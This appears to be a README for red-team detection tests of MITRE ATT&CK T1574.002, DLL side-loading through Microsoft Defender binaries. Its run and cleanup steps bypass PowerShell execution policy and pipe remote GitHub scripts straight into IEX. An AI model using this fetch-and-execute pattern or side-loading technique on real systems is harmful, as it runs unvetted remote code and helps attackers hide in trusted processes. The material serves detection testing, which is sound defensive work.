# 1574.002 - Hijack Execution Flow: DLL Side-loading (DLL Proxy-loading)
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1574/002/)
Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

## Tests

- #1) DLL Side-loading using MpCmdRun.exe
- #2) DLL Side-loading using NisSrv.exe

## How To Run
Open PowerShell.exe Then execute the following commands:

```PowerShell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Test 1
IEX(IWR "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/DLL_Sideloading_MpCmdRun.ps1")

# Test 2
IEX(IWR "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/DLL_Sideloading_NisSrv.ps1")
```

## How To Cleanup
Run the following command when you're finished testing and want to clean up:

```PowerShell
IEX(IWR "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/DLL_Sideloading_Cleanup.ps1")
```
